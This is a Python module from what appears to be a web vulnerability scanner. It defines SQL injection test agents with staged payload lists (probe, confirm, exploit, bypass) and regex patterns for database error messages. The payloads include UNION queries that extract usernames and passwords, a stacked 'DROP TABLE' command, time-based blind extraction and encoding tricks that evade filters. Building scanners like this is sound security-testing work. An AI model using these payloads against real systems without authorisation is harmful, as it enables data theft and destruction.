"""SQL Injection Agent - CWE-89."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class SQLiAgent(BaseAgent):
    """
    SQL Injection testing agent.

    Tests for various SQL injection vulnerabilities including:
    - Error-based injection
    - Boolean-based blind injection
    - Time-based blind injection
    - UNION-based injection
    - Stacked queries

    Payloads derived from ZAP's SqlInjectionScanRule.java
    """

    @property
    def vulnerability_type(self) -> str:
        return "sqli"

    @property
    def cweid(self) -> int:
        return 89

    @property
    def priority(self) -> int:
        return 9  # High priority - critical vulnerability

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # Basic probes
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "1' OR '1'='1' --",
                "1\" OR \"1\"=\"1\" --",
                "' OR 1=1--",
                "\" OR 1=1--",
                "1 OR 1=1",
                "' OR ''='",
                # Comment variations
                "'--",
                "'#",
                "')--",
                "';--",
            ],
            PayloadStage.CONFIRM: [
                # Error-based
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                # Boolean-based
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                # Syntax errors
                "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
                "'; SELECT SLEEP(0)--",
            ],
            PayloadStage.EXPLOIT: [
                # Data extraction
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                # Time-based blind
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR pg_sleep(5)--",
                # Stacked queries
                "'; DROP TABLE test--",
                "'; INSERT INTO logs VALUES('test')--",
            ],
            PayloadStage.BYPASS: [
                # Case variations
                "' oR '1'='1",
                "' Or '1'='1",
                "' OR '1'='1",
                # Encoding
                "%27%20OR%20%271%27%3D%271",
                "' OR '1'='1' /*",
                # Whitespace alternatives
                "'/**/OR/**/'1'='1",
                "'\tOR\t'1'='1",
                "'\nOR\n'1'='1",
                # Unicode
                "' OR '1'='1' --\x00",
                "' OR '1'\u003D'1",
                # Double encoding
                "%252527",
                # Comment injection
                "'/*!OR*/'1'='1",
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate SQL injection vulnerability."""
        patterns = [
            # MySQL errors
            r"You have an error in your SQL syntax",
            r"Warning.*mysql_",
            r"MySqlException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            # PostgreSQL errors
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            # MSSQL errors
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"\bSQL Server\b.*Driver",
            r"Warning.*mssql_",
            r"\bSQL Server\b.*[0-9a-fA-F]{8}",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark after the character string",
            # Oracle errors
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
            # SQLite errors
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQL error.*SQLITE",
            r"SQLite error",
            # Generic SQL errors
            r"SQL syntax.*",
            r"syntax error.*SQL",
            r"SQLSTATE\[",
            r"Syntax error or access violation",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
            # ORM/Framework errors
            r"org\.hibernate\.QueryException",
            r"javax\.persistence\.PersistenceException",
            r"com\.mysql\.jdbc\.exceptions",
            # Informative indicators
            r"Unknown column",
            r"Column.*not found",
            r"Table.*doesn't exist",
        ]
        return [re.compile(p, re.IGNORECASE) for p in patterns]


class SQLiErrorBasedAgent(SQLiAgent):
    """Specialized agent for error-based SQL injection."""

    @property
    def vulnerability_type(self) -> str:
        return "sqli_error"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                "'",
                "\"",
                "')",
                "\")",
                "';",
                "\";",
            ],
            PayloadStage.CONFIRM: [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND 1=CONVERT(int,@@version)--",
                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
            ],
            PayloadStage.EXPLOIT: [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            PayloadStage.BYPASS: [
                "' aNd EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                "'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/version())))--",
            ],
        }


class SQLiTimeBasedAgent(SQLiAgent):
    """Specialized agent for time-based blind SQL injection."""

    @property
    def vulnerability_type(self) -> str:
        return "sqli_time"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                "' OR SLEEP(2)--",
                "'; SELECT SLEEP(2)--",
                "' OR pg_sleep(2)--",
                "'; WAITFOR DELAY '0:0:2'--",
            ],
            PayloadStage.CONFIRM: [
                "' AND SLEEP(3)--",
                "1' AND SLEEP(3) AND '1'='1",
                "'; WAITFOR DELAY '0:0:3'--",
                "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
            ],
            PayloadStage.EXPLOIT: [
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0)--",
                "'; IF 1=1 WAITFOR DELAY '0:0:5'--",
            ],
            PayloadStage.BYPASS: [
                "'/**/OR/**/SLEEP(2)--",
                "' OR BENCHMARK(10000000,SHA1('test'))--",
            ],
        }
